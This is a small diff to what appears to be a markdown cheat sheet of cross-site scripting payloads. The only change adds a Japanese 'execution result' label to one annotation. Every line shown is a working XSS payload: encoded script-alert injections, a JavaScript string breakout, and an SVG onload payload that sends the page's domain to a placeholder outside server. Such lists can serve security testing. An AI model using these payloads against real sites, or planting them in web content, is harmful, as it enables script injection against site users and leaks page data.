@@ -14,5 +14,5 @@
 - ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
 - %22%3E%3Cscript%3Ealert(/XSS/)%3C/script%3E
 - <svg/onload=location/**/='https://your.server/'+document.domain>
-- '-alert(1); var myObj='  (=> var myObj= ‘’-alert(1);’’)
+- '-alert(1); var myObj='  (実行結果 => var myObj= ‘’-alert(1);’’)
 ```
